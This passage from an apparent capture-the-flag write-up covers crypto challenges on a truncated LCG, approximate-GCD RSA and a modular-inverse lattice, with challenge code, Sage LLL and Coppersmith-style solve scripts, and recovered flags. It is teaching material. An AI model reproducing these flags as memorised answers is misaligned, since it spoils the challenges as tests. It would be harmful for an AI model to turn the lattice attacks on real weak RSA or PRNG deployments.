class="line">p = getPrime(<span class="number">400</span>)</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    seed = (seed*a+b)%p</span><br><span class="line">    c.append(seed&gt;&gt;<span class="number">80</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://www.anquanke.com/post/id/204846">https://www.anquanke.com/post/id/204846</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = <span class="number">1372883756826335643900860677787413612322429341217562408695781600316979078457258981362973089185243041545146300735285019651</span></span><br><span class="line">b = <span class="number">1616840322678459360621150855366547863164363611723115131556281462274428722388780711443259966667402642255207063489033321533</span></span><br><span class="line">m = <span class="number">2141565647927890574190887477298374865093041664871165032669749937281208305153989668560224928991546602875840458004855584463</span></span><br><span class="line">h = [<span class="number">0</span>,<span class="number">1443574395247483148644856057251704784021992383977243317841569027284868510933981790366865421760703</span>,</span><br><span class="line">     <span class="number">183069754718902282305773783141952247255212452217012040185014286070868216807079491063768977456425</span>, </span><br><span class="line">     <span class="number">656882922755950063291884479762100383247622967393669466357663276997189742661779445200175739121700</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(h)):</span><br><span class="line">    h[i] &lt;&lt;= <span class="number">80</span></span><br><span class="line">A = [<span class="number">1</span>]</span><br><span class="line">B = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(h)-<span class="number">1</span>):</span><br><span class="line">    A.append(a*A[i-<span class="number">1</span>] % m)</span><br><span class="line">    B.append((a*B[i-<span class="number">1</span>]+a*h[i]+b-h[i+<span class="number">1</span>]) % m)</span><br><span class="line">A = A[<span class="number">1</span>:]</span><br><span class="line">B = B[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">M = matrix(ZZ, <span class="number">4</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    M[i, i] = m</span><br><span class="line">    M[<span class="number">2</span>, i] = A[i]</span><br><span class="line">    M[<span class="number">3</span>, i] = B[i]</span><br><span class="line">    M[i, <span class="number">2</span>] = M[i, <span class="number">3</span>] = <span class="number">0</span></span><br><span class="line">M[<span class="number">2</span>, <span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">M[<span class="number">3</span>, <span class="number">3</span>] = <span class="number">2</span> ^ <span class="number">80</span></span><br><span class="line">M[<span class="number">2</span>, <span class="number">3</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(B)</span></span><br><span class="line">vl = M.LLL()[<span class="number">0</span>]</span><br><span class="line">l1 = vl[-<span class="number">2</span>]</span><br><span class="line">h1 = h[<span class="number">1</span>]</span><br><span class="line">s1 = l1+h1</span><br><span class="line"><span class="comment"># s1 = a*seed+b %m</span></span><br><span class="line">seed = ((s1 - b)*inverse(a, m)) % m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(seed)))</span><br></pre></td></tr></table></figure><h3 id="approximate_n"><a class="markdownIt-Anchor" href="#approximate_n"></a> Approximate_n</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">gen_AGCD</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enc_</span>(<span class="params">self,M,e</span>):</span><br><span class="line">        C = <span class="built_in">pow</span>(M,e,self.p*self.q)</span><br><span class="line">        <span class="keyword">return</span> C</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">re_n</span>(<span class="params">self</span>):</span><br><span class="line">        n = self.p * self.q</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">re_approximate_n</span>(<span class="params">self</span>):</span><br><span class="line">        k = getPrime(<span class="number">512</span>)</span><br><span class="line">        r = getPrime(<span class="number">247</span>)</span><br><span class="line">        n_approx = k*self.p + r</span><br><span class="line">        <span class="keyword">return</span> n_approx</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m1 = flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]</span><br><span class="line">    m2 = flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]</span><br><span class="line">    Encrypt1,Encrypt2 = gen_AGCD(),gen_AGCD()</span><br><span class="line">    C1,C2 = Encrypt1.enc_(bytes_to_long(m1),e),Encrypt2.enc_(bytes_to_long(m2),e)</span><br><span class="line">    N1,N2 = Encrypt1.re_n(),Encrypt2.re_n()</span><br><span class="line"></span><br><span class="line">    N1_reveal = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        N1_reveal.append(Encrypt1.re_approximate_n())</span><br><span class="line"></span><br><span class="line">    N2_reveal = Encrypt2.re_approximate_n()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;N1 = &#x27;</span>,N1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;N1_reveal = &#x27;</span>,N1_reveal)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;N2 = &#x27;</span>,N2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;N2_reveal = &#x27;</span>,N2_reveal)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;C1 = &#x27;</span>,C1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;C2 = &#x27;</span>,C2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N1 =  <span class="number">96502134442306766630190365969731828363778727883130269833831263030729382766871708955277488203412149574872944055023685615073160369667055165391139363670343365821984677896491807268232979350387954877922372950950780243682743844394991203320165732899685131283935792499892753451307642209809221822663392152288471021823</span></span><br><span class="line">N1_reveal =  [<span class="number">77705219796898349926839885901362391697193123906793097191996261575925849175407332321710792825082720557513850089322295414039681336092072254571699321375948951222317860652999589472915517507845841365274672577833665771086028602962109439527025487395716932924154350199931185780615439190044249004833761057553520523896</span>, <span class="number">101771374571903364376825329513075440461454871187484412108119869577359241962284106364327462518581295773967857497026500027588743941459732681237456599924841361897234722105593154233281857197289498137900009205262742274923791549949458533045513858988834611935292011332698825945015525702084909340922702830454016057656</span>, <span class="number">103308066020173388243939013455456792344591089380053927065657190729114972231966344486044059361082182275581440708206370313045480128023096558669938992589910297035965428513951908770936451635495065599156803750919438422441607375265723488664344874309433366167807148690522496265012027209017979164952732695326414177286</span>]</span><br><span class="line">N2 =  <span class="number">126314490047348725931925643488256867451387192778862769831444516788178825429992308851796360209421085412834951813258034674586637300071003126259472461902145059495863191644177296794378246004326313468778347471025921062822075416776435141753193055544252015777211515476648743598597767600732476604052602226710111917901</span></span><br><span class="line">N2_reveal =  <span class="number">121607959929347554767372194929261215875140159338098709002526312843338792449854249114170076517560920373007281830626375354007883051759222075792058099882652989084139135581276833151653103140568975782125656853212748288106091928722346823038787133815664193186644142101267277257773877912682435219235133596307742055012</span></span><br><span class="line">C1 =  <span class="number">44080512978184690656370058935616299003323581502051429639925401005903492935613231824147617079462256232777256986769059389320542984689091032347985854417804295290617849869674512129448623567972538299941390255754255527203708858792913070477546701933716837223866296707744004945466536539909767255265003029320832208959</span></span><br><span class="line">C2 =  <span class="number">46651595204851181126381212982309553404707491725272581862478471261361163016056856873672585451522975118618342388104186158854329857236927126394691443786101092805387307362778152096810494593230077268362452994690142423590119812564735744326958141171384070061244342460928080183425972281861566674325530530993856201985</span></span><br></pre></td></tr></table></figure><p><a href="https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/">AGCD</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">N1 = <span class="number">96502134442306766630190365969731828363778727883130269833831263030729382766871708955277488203412149574872944055023685615073160369667055165391139363670343365821984677896491807268232979350387954877922372950950780243682743844394991203320165732899685131283935792499892753451307642209809221822663392152288471021823</span></span><br><span class="line">C1 = <span class="number">44080512978184690656370058935616299003323581502051429639925401005903492935613231824147617079462256232777256986769059389320542984689091032347985854417804295290617849869674512129448623567972538299941390255754255527203708858792913070477546701933716837223866296707744004945466536539909767255265003029320832208959</span></span><br><span class="line">N1_reveal = [<span class="number">77705219796898349926839885901362391697193123906793097191996261575925849175407332321710792825082720557513850089322295414039681336092072254571699321375948951222317860652999589472915517507845841365274672577833665771086028602962109439527025487395716932924154350199931185780615439190044249004833761057553520523896</span>, <span class="number">101771374571903364376825329513075440461454871187484412108119869577359241962284106364327462518581295773967857497026500027588743941459732681237456599924841361897234722105593154233281857197289498137900009205262742274923791549949458533045513858988834611935292011332698825945015525702084909340922702830454016057656</span>, <span class="number">103308066020173388243939013455456792344591089380053927065657190729114972231966344486044059361082182275581440708206370313045480128023096558669938992589910297035965428513951908770936451635495065599156803750919438422441607375265723488664344874309433366167807148690522496265012027209017979164952732695326414177286</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">mat = [[<span class="number">2</span> ^ <span class="number">248</span>, N1_reveal[<span class="number">1</span>], N1_reveal[<span class="number">2</span>]], [<span class="number">0</span>, -N1_reveal[<span class="number">0</span>], <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, -N1_reveal[<span class="number">0</span>]]]</span><br><span class="line">M = Matrix(ZZ, mat)</span><br><span class="line">k0 = <span class="built_in">abs</span>(M.LLL()[<span class="number">0</span>][<span class="number">0</span>]) // <span class="number">2</span> ^ <span class="number">248</span></span><br><span class="line">p = N1_reveal[<span class="number">0</span>] // k0</span><br><span class="line">q = N1 // p</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(C1, d, N1))).decode())</span><br><span class="line"><span class="comment"># SHCTF&#123;apProXlM4TE_N_H4</span></span><br></pre></td></tr></table></figure><p><strong>PACD</strong><br /><a href="https://tangcuxiaojikuai.xyz/post/4a67318c.html">wp1.12.12</a>Orzzzzz</p><p><a href="https://mp.weixin.qq.com/s/dUcx4dYeURb24gkqB4iSYQ">wp</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve1</span>(<span class="params">N1_reveal</span>):</span><br><span class="line">    Len = <span class="built_in">len</span>(N1_reveal)</span><br><span class="line">    A = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(Len)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(Len)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Len):</span><br><span class="line">        A[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">2</span>**<span class="number">251</span></span><br><span class="line">        A[i][i] = -N1_reveal[<span class="number">0</span>]</span><br><span class="line">        A[<span class="number">0</span>][i] = N1_reveal[i]</span><br><span class="line"></span><br><span class="line">    A = matrix(ZZ, A)</span><br><span class="line">    A_solve = A.LLL()</span><br><span class="line"></span><br><span class="line">    k0 = <span class="built_in">abs</span>(A_solve[<span class="number">0</span>, <span class="number">0</span>]) // (<span class="number">2</span>**<span class="number">251</span>)</span><br><span class="line">    p = N1_reveal[<span class="number">0</span>] // k0</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve2</span>(<span class="params">N, N1, t, k, sys</span>):</span><br><span class="line">    var(<span class="string">&#x27;x y&#x27;</span>)</span><br><span class="line">    f = N1 - x</span><br><span class="line">    Q_polys = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(t + <span class="number">1</span>):</span><br><span class="line">        x1, x2, x3 = <span class="built_in">max</span>(k - j, <span class="number">0</span>), <span class="built_in">min</span>(j, k), <span class="built_in">max</span>(j - k, <span class="number">0</span>)</span><br><span class="line">        Q_polys.append(N**(x1) * f**(x2) * x**(x3))</span><br><span class="line"></span><br><span class="line">    len_Q = t + <span class="number">1</span></span><br><span class="line">    B = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Q_polys:</span><br><span class="line">        J = i.coefficients()</span><br><span class="line">        b = [<span class="number">0</span> * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(len_Q)]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> J:</span><br><span class="line">            b[j[<span class="number">1</span>]] = ZZ(j[<span class="number">0</span>]) * (<span class="number">2</span>**sys)**ZZ(j[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        B.append(b[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    B = matrix(QQ, B)</span><br><span class="line">    solve_B = B.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=== We have found the right B_LLL ===&#x27;</span>)</span><br><span class="line">    BB = solve_B[<span class="number">0</span>]</span><br><span class="line">    a = [BB[i] // ((<span class="number">2</span>**sys)**(t - i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_Q)]</span><br><span class="line">    </span><br><span class="line">    f1 = <span class="built_in">sum</span>(a[i] * x**(t - i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t + <span class="number">1</span>))</span><br><span class="line">    m = f1.roots(multiplicities=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># First part</span></span><br><span class="line">    N1 = <span class="number">152952981944000100965638860967602827566778521492487050491892827674361544670819337749785802004935917933682378674371592431931030006263550462078568397201797421799133055122247087592029620139237110046703705970063264710838333520122569715133956574555308030406142657069010739854876223563665391381467693316799077562631</span></span><br><span class="line">    N1_reveal = [</span><br><span class="line">        <span class="number">93468146961503699670349582663589460392367381003360753998849635467834109329797684521052329961180631916859515284206764142310372205159222106596242263153896728879084898629423535394124469773008692396830494914352138651073601861340964731819865482810779087666392285305203522266859409492705495993697069222798873726960</span>,</span><br><span class="line">        <span class="number">104236574927656394650569462832082413075782565853751822615159241825222661691226282897836986441960802720967958907731302400903695988149825216397968325252362370979139937478581483399525815281298614897697149261611978635688552921229950818270323755332455301763156318841119986217470444550142872582768290596482687744424</span>,</span><br><span class="line">        <span class="number">111344636205100432122150931949073552736191028277954358828475656601131912158613340112534257389822848254590508022360957981663909238892049647529257898438607265543877295425311970143364489439451122473266322338624662429675715687546673545518635013973444850954299112981470324421581526800664146117051212442370458976160</span></span><br><span class="line">    ]</span><br><span class="line">    N2 = <span class="number">161000399096301338674145679646803449371884584783717643268822418066620108407731540425248748533274852271981238626583833936952481982310960867551626932936647644974305095312215770087022986994903359281662387821626872045714904933693788625089056417708989083541828993779459498763207176730305258351465296844035402992037</span></span><br><span class="line">    N2_reveal = <span class="number">94357561554041679026592892471969668587647998642633209852151089525750487249954579819289811636051497958155667305620006329556344469501081714147153506848627046878474589251168180372471471342863289188504937739676178745002243329722947845252016138510055976215692978579052562147323290563188038148717392659754084259868</span></span><br><span class="line">    C1 = <span class="number">58594793302586275577689791690916913430813466918408684969682636302311071900226219937673437452062598539194973815823691328343903675454727770424091510402364067928727276503529768938503877868193223803409389316480107820270032654504227476928880926262835555278965327337517905481056020439215084989992384844952072797767</span></span><br><span class="line">    C2 = <span class="number">96355602042990531636996233678782492485176551414647666201694738677085382408306061625779061776073653265708098763914371044105367860146561867196601390320646644981522466233466082942467352765311760481386653836121412702539810520173452171910779083525937819154456189707020401497882337846898520990299400500600590240447</span></span><br><span class="line">    </span><br><span class="line">    p0 = solve1(N1_reveal)</span><br><span class="line">    q0 = N1 // p0</span><br><span class="line">    phi0 = (p0 - <span class="number">1</span>) * (q0 - <span class="number">1</span>)</span><br><span class="line">    d0 = inverse(<span class="built_in">int</span>(e), <span class="built_in">int</span>(phi0))</span><br><span class="line">    flag1 = long_to_bytes(<span class="built_in">pow</span>(<span class="built_in">int</span>(C1), <span class="built_in">int</span>(d0), <span class="built_in">int</span>(N1)))</span><br><span class="line">    <span class="built_in">print</span>(flag1)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Second part</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    r_solve = solve2(N2, N2_reveal, <span class="number">32</span>, <span class="number">16</span>, <span class="number">247</span>)[<span class="number">0</span>]</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;The consumption of time is:&#x27;</span>, end - start)</span><br><span class="line">    </span><br><span class="line">    p1 = GCD(<span class="built_in">int</span>(N2), <span class="built_in">int</span>(N2_reveal - r_solve))</span><br><span class="line">    q1 = N2 // p1</span><br><span class="line">    phi1 = (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>)</span><br><span class="line">    d1 = inverse(<span class="built_in">int</span>(e), <span class="built_in">int</span>(phi1))</span><br><span class="line">    flag2 = long_to_bytes(<span class="built_in">pow</span>(<span class="built_in">int</span>(C2), <span class="built_in">int</span>(d1), <span class="built_in">int</span>(N2)))</span><br><span class="line">    </span><br><span class="line">    flag = flag1 + flag2</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;SHCTF&#123;aPPr0XlmATE_n_Ha&#x27;</span></span><br><span class="line"><span class="string">=== We have found the right B_LLL ===</span></span><br><span class="line"><span class="string">[127990506151602747223338072930951429851562684252303322353834484627148943881]</span></span><br><span class="line"><span class="string">The consumption of time is: 21.33029294013977</span></span><br><span class="line"><span class="string">b&#x27;SHCTF&#123;aPPr0XlmATE_n_HaPPy_thE_nEw_gG4G_Z_2F&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="lattice"><a class="markdownIt-Anchor" href="#lattice"></a> Lattice</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n = getPrime(<span class="number">1024</span>)</span><br><span class="line">x = getPrime(<span class="number">200</span>)</span><br><span class="line">hint = (x*gmpy2.invert(m,n)) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;hint = <span class="subst">&#123;hint&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 145848130693758117543412571487372860506913235602516809974808585818522269136564650276188615818190323186398953857101908968758176245420927884552132860870716227938682446515612285455042030232618089765452507888912611184083526823439265617219381992067586404368454945188603041053893851526230640924307097690926185151461</span></span><br><span class="line"><span class="string">hint = 5320062530050244856400971682135383371777368095215566601290251095974038808423579214623058814514827385162275539682781206812688885576283033343821681589154704394235000387503484688642086179809749262851140803203040860523361516855245641425935013688442339456695107400868547828586043122364556477095674662788145610351</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mi>k</mi><mo></mo><mi>n</mi><mo>+</mo><mi>m</mi><mo></mo><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">x=k*n+m*hint</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>k</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo></mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>n</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext></mtext><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>x</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\left [ \begin{matrix}k&amp;m\\\end{matrix} \right ]*\left [ \begin{matrix}n&amp;0\\hint&amp;1\\\end{matrix} \right ]\ =\left [ \begin{matrix}x&amp;m\\\end{matrix} \right ]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">145848130693758117543412571487372860506913235602516809974808585818522269136564650276188615818190323186398953857101908968758176245420927884552132860870716227938682446515612285455042030232618089765452507888912611184083526823439265617219381992067586404368454945188603041053893851526230640924307097690926185151461</span></span><br><span class="line">hint = <span class="number">5320062530050244856400971682135383371777368095215566601290251095974038808423579214623058814514827385162275539682781206812688885576283033343821681589154704394235000387503484688642086179809749262851140803203040860523361516855245641425935013688442339456695107400868547828586043122364556477095674662788145610351</span></span><br><span class="line">mat = [[n, <span class="number">0</span>], [hint, <span class="number">1</span>]]</span><br><span class="line">M = Matrix(ZZ, 